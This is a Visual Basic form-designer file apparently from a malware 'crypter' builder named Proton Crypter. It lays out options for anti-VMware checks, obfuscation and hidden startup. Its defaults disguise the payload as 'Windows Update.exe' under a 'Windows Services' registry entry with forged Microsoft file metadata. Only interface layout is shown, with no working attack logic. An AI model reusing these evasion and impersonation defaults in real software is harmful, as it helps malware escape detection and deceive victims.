        'CustomCheckBox4
        '
        Me.CustomCheckBox4.AutoSize = True
        Me.CustomCheckBox4.BackColor = System.Drawing.Color.Transparent
        Me.CustomCheckBox4.Enabled = False
        Me.CustomCheckBox4.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.CustomCheckBox4.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.CustomCheckBox4.Location = New System.Drawing.Point(26, 62)
        Me.CustomCheckBox4.Name = "CustomCheckBox4"
        Me.CustomCheckBox4.Size = New System.Drawing.Size(186, 21)
        Me.CustomCheckBox4.TabIndex = 201
        Me.CustomCheckBox4.Text = "Anti - VMware Workstation"
        Me.CustomCheckBox4.UseVisualStyleBackColor = False
        '
        'CustomCheckBox3
        '
        Me.CustomCheckBox3.AutoSize = True
        Me.CustomCheckBox3.BackColor = System.Drawing.Color.Transparent
        Me.CustomCheckBox3.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.CustomCheckBox3.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.CustomCheckBox3.Location = New System.Drawing.Point(26, 35)
        Me.CustomCheckBox3.Name = "CustomCheckBox3"
        Me.CustomCheckBox3.Size = New System.Drawing.Size(94, 21)
        Me.CustomCheckBox3.TabIndex = 200
        Me.CustomCheckBox3.Text = "Obfuscator"
        Me.CustomCheckBox3.UseVisualStyleBackColor = False
        '
        'TabPage2
        '
        Me.TabPage2.BackColor = System.Drawing.Color.FromArgb(CType(CType(18, Byte), Integer), CType(CType(18, Byte), Integer), CType(CType(18, Byte), Integer))
        Me.TabPage2.Controls.Add(Me.MyButton5)
        Me.TabPage2.Controls.Add(Me.Label30)
        Me.TabPage2.Controls.Add(Me.TextBox11)
        Me.TabPage2.Controls.Add(Me.TextBox12)
        Me.TabPage2.Controls.Add(Me.Label16)
        Me.TabPage2.Controls.Add(Me.TextBox13)
        Me.TabPage2.Controls.Add(Me.Label15)
        Me.TabPage2.Controls.Add(Me.Label14)
        Me.TabPage2.Controls.Add(Me.CustomCheckBox1)
        Me.TabPage2.Cursor = System.Windows.Forms.Cursors.Default
        Me.TabPage2.Location = New System.Drawing.Point(119, 4)
        Me.TabPage2.Name = "TabPage2"
        Me.TabPage2.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage2.Size = New System.Drawing.Size(451, 349)
        Me.TabPage2.TabIndex = 1
        Me.TabPage2.Text = "Startup"
        '
        'MyButton5
        '
        Me.MyButton5.BackColor = System.Drawing.Color.Transparent
        Me.MyButton5.BackgroundImage = CType(resources.GetObject("MyButton5.BackgroundImage"), System.Drawing.Image)
        Me.MyButton5.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch
        Me.MyButton5.Enabled = False
        Me.MyButton5.FlatAppearance.BorderSize = 0
        Me.MyButton5.FlatAppearance.MouseDownBackColor = System.Drawing.Color.Transparent
        Me.MyButton5.FlatAppearance.MouseOverBackColor = System.Drawing.Color.Transparent
        Me.MyButton5.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.MyButton5.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.MyButton5.Location = New System.Drawing.Point(152, 227)
        Me.MyButton5.Name = "MyButton5"
        Me.MyButton5.Size = New System.Drawing.Size(114, 23)
        Me.MyButton5.TabIndex = 256
        Me.MyButton5.Text = "Generate"
        Me.MyButton5.UseVisualStyleBackColor = False
        '
        'Label30
        '
        Me.Label30.AutoSize = True
        Me.Label30.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.Label30.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.Label30.Location = New System.Drawing.Point(108, 43)
        Me.Label30.Name = "Label30"
        Me.Label30.Size = New System.Drawing.Size(256, 34)
        Me.Label30.TabIndex = 253
        Me.Label30.Text = "If you're wanting to run Crypter hidden, try " & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "Hidden Startup for more terse exec" & _
    "ution." & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10)
        '
        'TextBox11
        '
        Me.TextBox11.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer))
        Me.TextBox11.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.TextBox11.Enabled = False
        Me.TextBox11.Font = New System.Drawing.Font("Century Gothic", 9.75!)
        Me.TextBox11.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.TextBox11.Location = New System.Drawing.Point(152, 165)
        Me.TextBox11.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.TextBox11.Name = "TextBox11"
        Me.TextBox11.Size = New System.Drawing.Size(230, 23)
        Me.TextBox11.TabIndex = 247
        Me.TextBox11.Text = "Windows Update Folder"
        '
        'TextBox12
        '
        Me.TextBox12.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer))
        Me.TextBox12.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.TextBox12.Enabled = False
        Me.TextBox12.Font = New System.Drawing.Font("Century Gothic", 9.75!)
        Me.TextBox12.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.TextBox12.Location = New System.Drawing.Point(152, 197)
        Me.TextBox12.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.TextBox12.Name = "TextBox12"
        Me.TextBox12.Size = New System.Drawing.Size(230, 23)
        Me.TextBox12.TabIndex = 248
        Me.TextBox12.Text = "Windows Services"
        '
        'Label16
        '
        Me.Label16.AutoSize = True
        Me.Label16.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.Label16.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.Label16.Location = New System.Drawing.Point(43, 199)
        Me.Label16.Name = "Label16"
        Me.Label16.Size = New System.Drawing.Size(103, 17)
        Me.Label16.TabIndex = 252
        Me.Label16.Text = "Regedit Name : "
        '
        'TextBox13
        '
        Me.TextBox13.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer))
        Me.TextBox13.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.TextBox13.Enabled = False
        Me.TextBox13.Font = New System.Drawing.Font("Century Gothic", 9.75!)
        Me.TextBox13.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.TextBox13.Location = New System.Drawing.Point(152, 133)
        Me.TextBox13.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.TextBox13.Name = "TextBox13"
        Me.TextBox13.Size = New System.Drawing.Size(230, 23)
        Me.TextBox13.TabIndex = 249
        Me.TextBox13.Text = "Windows Update.exe"
        '
        'Label15
        '
        Me.Label15.AutoSize = True
        Me.Label15.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.Label15.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.Label15.Location = New System.Drawing.Point(70, 135)
        Me.Label15.Name = "Label15"
        Me.Label15.Size = New System.Drawing.Size(76, 17)
        Me.Label15.TabIndex = 251
        Me.Label15.Text = "File Name : "
        '
        'Label14
        '
        Me.Label14.AutoSize = True
        Me.Label14.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.Label14.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.Label14.Location = New System.Drawing.Point(53, 167)
        Me.Label14.Name = "Label14"
        Me.Label14.Size = New System.Drawing.Size(93, 17)
        Me.Label14.TabIndex = 250
        Me.Label14.Text = "Folder Name : "
        '
        'CustomCheckBox1
        '
        Me.CustomCheckBox1.AutoSize = True
        Me.CustomCheckBox1.BackColor = System.Drawing.Color.Transparent
        Me.CustomCheckBox1.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.CustomCheckBox1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.CustomCheckBox1.Location = New System.Drawing.Point(152, 105)
        Me.CustomCheckBox1.Name = "CustomCheckBox1"
        Me.CustomCheckBox1.Size = New System.Drawing.Size(116, 21)
        Me.CustomCheckBox1.TabIndex = 195
        Me.CustomCheckBox1.Text = "Hidden Startup"
        Me.CustomCheckBox1.UseVisualStyleBackColor = False
        '
        'TabPage3
        '
        Me.TabPage3.BackColor = System.Drawing.Color.FromArgb(CType(CType(18, Byte), Integer), CType(CType(18, Byte), Integer), CType(CType(18, Byte), Integer))
        Me.TabPage3.Controls.Add(Me.MyButton6)
        Me.TabPage3.Controls.Add(Me.CustomCheckBox2)
        Me.TabPage3.Controls.Add(Me.Label38)
        Me.TabPage3.Controls.Add(Me.Label11)
        Me.TabPage3.Controls.Add(Me.TextBoxNum3)
        Me.TabPage3.Controls.Add(Me.TextBoxNum4)
        Me.TabPage3.Controls.Add(Me.TextBoxNum1)
        Me.TabPage3.Controls.Add(Me.TextBoxNum2)
        Me.TabPage3.Controls.Add(Me.TextBoxCopyright)
        Me.TabPage3.Controls.Add(Me.Label7)
        Me.TabPage3.Controls.Add(Me.TextBoxProduct)
        Me.TabPage3.Controls.Add(Me.Label6)
        Me.TabPage3.Controls.Add(Me.TextBoxCompany)
        Me.TabPage3.Controls.Add(Me.Label5)
        Me.TabPage3.Controls.Add(Me.TextBoxDescription)
        Me.TabPage3.Controls.Add(Me.Label8)
        Me.TabPage3.Controls.Add(Me.TextBoxTitle)
        Me.TabPage3.Controls.Add(Me.Label19)
        Me.TabPage3.Location = New System.Drawing.Point(119, 4)
        Me.TabPage3.Name = "TabPage3"
        Me.TabPage3.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage3.Size = New System.Drawing.Size(451, 349)
        Me.TabPage3.TabIndex = 2
        Me.TabPage3.Text = "Assembly"
        '
        'MyButton6
        '
        Me.MyButton6.BackColor = System.Drawing.Color.Transparent
        Me.MyButton6.BackgroundImage = CType(resources.GetObject("MyButton6.BackgroundImage"), System.Drawing.Image)
        Me.MyButton6.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch
        Me.MyButton6.Enabled = False
        Me.MyButton6.FlatAppearance.BorderSize = 0
        Me.MyButton6.FlatAppearance.MouseDownBackColor = System.Drawing.Color.Transparent
        Me.MyButton6.FlatAppearance.MouseOverBackColor = System.Drawing.Color.Transparent
        Me.MyButton6.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.MyButton6.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.MyButton6.Location = New System.Drawing.Point(148, 287)
        Me.MyButton6.Name = "MyButton6"
        Me.MyButton6.Size = New System.Drawing.Size(114, 23)
        Me.MyButton6.TabIndex = 264
        Me.MyButton6.Text = "Load"
        Me.MyButton6.UseVisualStyleBackColor = False
        '
        'CustomCheckBox2
        '
        Me.CustomCheckBox2.AutoSize = True
        Me.CustomCheckBox2.BackColor = System.Drawing.Color.Transparent
        Me.CustomCheckBox2.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.CustomCheckBox2.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.CustomCheckBox2.Location = New System.Drawing.Point(148, 86)
        Me.CustomCheckBox2.Name = "CustomCheckBox2"
        Me.CustomCheckBox2.Size = New System.Drawing.Size(136, 21)
        Me.CustomCheckBox2.TabIndex = 263
        Me.CustomCheckBox2.Text = "Assembly Changer"
        Me.CustomCheckBox2.UseVisualStyleBackColor = False
        '
        'Label38
        '
        Me.Label38.AutoSize = True
        Me.Label38.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.Label38.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.Label38.Location = New System.Drawing.Point(120, 31)
        Me.Label38.Name = "Label38"
        Me.Label38.Size = New System.Drawing.Size(251, 34)
        Me.Label38.TabIndex = 262
        Me.Label38.Text = "With the Clone method" & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "You can withdraw all version information."
        '
        'Label11
        '
        Me.Label11.AutoSize = True
        Me.Label11.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.Label11.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.Label11.Location = New System.Drawing.Point(58, 260)
        Me.Label11.Name = "Label11"
        Me.Label11.Size = New System.Drawing.Size(84, 17)
        Me.Label11.TabIndex = 261
        Me.Label11.Text = "File Version : "
        '
        'TextBoxNum3
        '
        Me.TextBoxNum3.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer))
        Me.TextBoxNum3.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.TextBoxNum3.Enabled = False
        Me.TextBoxNum3.Font = New System.Drawing.Font("Century Gothic", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.TextBoxNum3.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.TextBoxNum3.Location = New System.Drawing.Point(268, 258)
        Me.TextBoxNum3.Name = "TextBoxNum3"
        Me.TextBoxNum3.Size = New System.Drawing.Size(54, 23)
        Me.TextBoxNum3.TabIndex = 260
        Me.TextBoxNum3.Text = "17763"
        '
        'TextBoxNum4
        '
        Me.TextBoxNum4.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer))
        Me.TextBoxNum4.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.TextBoxNum4.Enabled = False
        Me.TextBoxNum4.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.TextBoxNum4.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.TextBoxNum4.Location = New System.Drawing.Point(328, 258)
        Me.TextBoxNum4.Name = "TextBoxNum4"
        Me.TextBoxNum4.Size = New System.Drawing.Size(54, 22)
        Me.TextBoxNum4.TabIndex = 259
        Me.TextBoxNum4.Text = "0"
        '
        'TextBoxNum1
        '
        Me.TextBoxNum1.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer))
        Me.TextBoxNum1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.TextBoxNum1.Enabled = False
        Me.TextBoxNum1.Font = New System.Drawing.Font("Century Gothic", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.TextBoxNum1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.TextBoxNum1.Location = New System.Drawing.Point(148, 258)
        Me.TextBoxNum1.Name = "TextBoxNum1"
        Me.TextBoxNum1.Size = New System.Drawing.Size(54, 23)
        Me.TextBoxNum1.TabIndex = 258
        Me.TextBoxNum1.Text = "10"
        '
        'TextBoxNum2
        '
        Me.TextBoxNum2.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer))
        Me.TextBoxNum2.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.TextBoxNum2.Enabled = False
        Me.TextBoxNum2.Font = New System.Drawing.Font("Century Gothic", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.TextBoxNum2.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.TextBoxNum2.Location = New System.Drawing.Point(208, 258)
        Me.TextBoxNum2.Name = "TextBoxNum2"
        Me.TextBoxNum2.Size = New System.Drawing.Size(54, 23)
        Me.TextBoxNum2.TabIndex = 257
        Me.TextBoxNum2.Text = "0"
        '
        'TextBoxCopyright
        '
        Me.TextBoxCopyright.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer))
        Me.TextBoxCopyright.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.TextBoxCopyright.Enabled = False
        Me.TextBoxCopyright.Font = New System.Drawing.Font("Century Gothic", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.TextBoxCopyright.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.TextBoxCopyright.Location = New System.Drawing.Point(148, 229)
        Me.TextBoxCopyright.Name = "TextBoxCopyright"
        Me.TextBoxCopyright.Size = New System.Drawing.Size(234, 23)
        Me.TextBoxCopyright.TabIndex = 256
        Me.TextBoxCopyright.Text = "© Microsoft Corporation. All Rights Reserved."
        '
        'Label7
        '
        Me.Label7.AutoSize = True
        Me.Label7.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.Label7.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.Label7.Location = New System.Drawing.Point(67, 231)
        Me.Label7.Name = "Label7"
        Me.Label7.Size = New System.Drawing.Size(75, 17)
        Me.Label7.TabIndex = 255
        Me.Label7.Text = "Copyright : "
        '
        'TextBoxProduct
        '
        Me.TextBoxProduct.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer))
        Me.TextBoxProduct.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.TextBoxProduct.Enabled = False
        Me.TextBoxProduct.Font = New System.Drawing.Font("Century Gothic", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.TextBoxProduct.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.TextBoxProduct.Location = New System.Drawing.Point(148, 200)
        Me.TextBoxProduct.Name = "TextBoxProduct"
        Me.TextBoxProduct.Size = New System.Drawing.Size(234, 23)
        Me.TextBoxProduct.TabIndex = 254
        Me.TextBoxProduct.Text = "Microsoft® Windows®-operativsystem"
        '
        'Label6
        '
        Me.Label6.AutoSize = True
        Me.Label6.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.Label6.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.Label6.Location = New System.Drawing.Point(78, 202)
        Me.Label6.Name = "Label6"
        Me.Label6.Size = New System.Drawing.Size(64, 17)
        Me.Label6.TabIndex = 253
        Me.Label6.Text = "Product : "
        '
        'TextBoxCompany
        '
        Me.TextBoxCompany.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer))
        Me.TextBoxCompany.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.TextBoxCompany.Enabled = False
        Me.TextBoxCompany.Font = New System.Drawing.Font("Century Gothic", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.TextBoxCompany.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.TextBoxCompany.Location = New System.Drawing.Point(148, 171)
        Me.TextBoxCompany.Name = "TextBoxCompany"
        Me.TextBoxCompany.Size = New System.Drawing.Size(234, 23)
        Me.TextBoxCompany.TabIndex = 252
        Me.TextBoxCompany.Text = "Microsoft Corporation"
        '
        'Label5
        '
        Me.Label5.AutoSize = True
        Me.Label5.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.Label5.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.Label5.Location = New System.Drawing.Point(68, 173)
        Me.Label5.Name = "Label5"
        Me.Label5.Size = New System.Drawing.Size(74, 17)
        Me.Label5.TabIndex = 251
        Me.Label5.Text = "Company : "
        '
        'TextBoxDescription
        '
        Me.TextBoxDescription.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer))
        Me.TextBoxDescription.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.TextBoxDescription.Enabled = False
        Me.TextBoxDescription.Font = New System.Drawing.Font("Century Gothic", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.TextBoxDescription.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.TextBoxDescription.Location = New System.Drawing.Point(148, 142)
        Me.TextBoxDescription.Name = "TextBoxDescription"
        Me.TextBoxDescription.Size = New System.Drawing.Size(234, 23)
        Me.TextBoxDescription.TabIndex = 250
        Me.TextBoxDescription.Text = "Chinhu-Chakasenderwa Service Message DLL"
        '
        'Label8
        '
        Me.Label8.AutoSize = True
        Me.Label8.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.Label8.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.Label8.Location = New System.Drawing.Point(57, 144)
        Me.Label8.Name = "Label8"
        Me.Label8.Size = New System.Drawing.Size(85, 17)
        Me.Label8.TabIndex = 249
        Me.Label8.Text = "Description : "
        '
        'TextBoxTitle
        '
        Me.TextBoxTitle.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer), CType(CType(30, Byte), Integer))
        Me.TextBoxTitle.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.TextBoxTitle.Enabled = False
        Me.TextBoxTitle.Font = New System.Drawing.Font("Century Gothic", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.TextBoxTitle.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.TextBoxTitle.Location = New System.Drawing.Point(148, 113)
        Me.TextBoxTitle.Name = "TextBoxTitle"
        Me.TextBoxTitle.Size = New System.Drawing.Size(234, 23)
        Me.TextBoxTitle.TabIndex = 248
        Me.TextBoxTitle.Text = "cbsmsg.dll"
        '
        'Label19
        '
        Me.Label19.AutoSize = True
        Me.Label19.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.Label19.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.Label19.Location = New System.Drawing.Point(101, 115)
        Me.Label19.Name = "Label19"
        Me.Label19.Size = New System.Drawing.Size(41, 17)
        Me.Label19.TabIndex = 247
        Me.Label19.Text = "Title : "
        '
        'TabPage4
        '
        Me.TabPage4.BackColor = System.Drawing.Color.FromArgb(CType(CType(18, Byte), Integer), CType(CType(18, Byte), Integer), CType(CType(18, Byte), Integer))
        Me.TabPage4.Controls.Add(Me.Label21)
        Me.TabPage4.Controls.Add(Me.Label20)
        Me.TabPage4.Controls.Add(Me.TextBox6)
        Me.TabPage4.Location = New System.Drawing.Point(119, 4)
        Me.TabPage4.Name = "TabPage4"
        Me.TabPage4.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage4.Size = New System.Drawing.Size(451, 349)
        Me.TabPage4.TabIndex = 3
        Me.TabPage4.Text = "About"
        '
        'Label21
        '
        Me.Label21.AutoSize = True
        Me.Label21.Cursor = System.Windows.Forms.Cursors.Hand
        Me.Label21.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.Label21.ForeColor = System.Drawing.Color.FromArgb(CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer), CType(CType(180, Byte), Integer))
        Me.Label21.Location = New System.Drawing.Point(34, 151)
        Me.Label21.Name = "Label21"
        Me.Label21.Size = New System.Drawing.Size(222, 17)
        Me.Label21.TabIndex = 251
        Me.Label21.Text = "https://discord.com/invite/npe7x9Q"
        '
        'Label20
        '
        Me.Label20.AutoSize = True
        Me.Label20.Cursor = System.Windows.Forms.Cursors.Hand
        Me.Label20.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.Label20.ForeColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(118, Byte), Integer), CType(CType(87, Byte), Integer))
        Me.Label20.Location = New System.Drawing.Point(98, 279)
        Me.Label20.Name = "Label20"
        Me.Label20.Size = New System.Drawing.Size(232, 17)
        Me.Label20.TabIndex = 250
        Me.Label20.Text = "http://www.theprotonprotector.com/"
        '
        'TextBox6
        '
        Me.TextBox6.BackColor = System.Drawing.Color.FromArgb(CType(CType(18, Byte), Integer), CType(CType(18, Byte), Integer), CType(CType(18, Byte), Integer))
        Me.TextBox6.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.TextBox6.Enabled = False
        Me.TextBox6.Font = New System.Drawing.Font("Century Gothic", 9.0!)
        Me.TextBox6.ForeColor = System.Drawing.Color.FromArgb(CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer), CType(CType(150, Byte), Integer))
        Me.TextBox6.Location = New System.Drawing.Point(34, 46)
        Me.TextBox6.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.TextBox6.Multiline = True
        Me.TextBox6.Name = "TextBox6"
        Me.TextBox6.Size = New System.Drawing.Size(386, 250)
        Me.TextBox6.TabIndex = 249
        Me.TextBox6.Text = resources.GetString("TextBox6.Text")
        '
        'frmMain
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.BackColor = System.Drawing.Color.FromArgb(CType(CType(18, Byte), Integer), CType(CType(18, Byte), Integer), CType(CType(18, Byte), Integer))
        Me.ClientSize = New System.Drawing.Size(598, 538)
        Me.Controls.Add(Me.PictureBox1)
        Me.Controls.Add(Me.Label1)
        Me.Controls.Add(Me.ChromeTabcontrol1)
        Me.Controls.Add(Me.Panel1)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.Name = "frmMain"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = "Proton Crypter"
        Me.Panel1.ResumeLayout(False)
        Me.Panel1.PerformLayout()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ChromeTabcontrol1.ResumeLayout(False)
        Me.TabPage1.ResumeLayout(False)
        Me.TabPage1.PerformLayout()
        CType(Me.PictureBox4, System.ComponentModel.ISupportInitialize).EndInit()
        Me.TabPage5.ResumeLayout(False)
        Me.TabPage5.PerformLayout()
        Me.TabPage2.ResumeLayout(False)
        Me.TabPage2.PerformLayout()
        Me.TabPage3.ResumeLayout(False)
        Me.TabPage3.PerformLayout()
        Me.TabPage4.ResumeLayout(False)
        Me.TabPage4.PerformLayout()
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub
    Friend WithEvents Label1 As System.Windows.Forms.Label
    Friend WithEvents Label9 As System.Windows.Forms.Label
    Friend WithEvents Panel1 As System.Windows.Forms.Panel
    Friend WithEvents ChromeTabcontrol1 As Proton_Crypter.ChromeTabcontrol
    Friend WithEvents TabPage2 As System.Windows.Forms.TabPage
    Friend WithEvents TabPage3 As System.Windows.Forms.TabPage
    Friend WithEvents TabPage4 As System.Windows.Forms.TabPage
    Friend WithEvents TextBox6 As System.Windows.Forms.TextBox
    Friend WithEvents CustomCheckBox1 As Proton_Crypter.CustomCheckBox
    Friend WithEvents Label30 As System.Windows.Forms.Label
    Friend WithEvents TextBox11 As System.Windows.Forms.TextBox
    Friend WithEvents TextBox12 As System.Windows.Forms.TextBox
    Friend WithEvents Label16 As System.Windows.Forms.Label
    Friend WithEvents TextBox13 As System.Windows.Forms.TextBox
    Friend WithEvents Label15 As System.Windows.Forms.Label
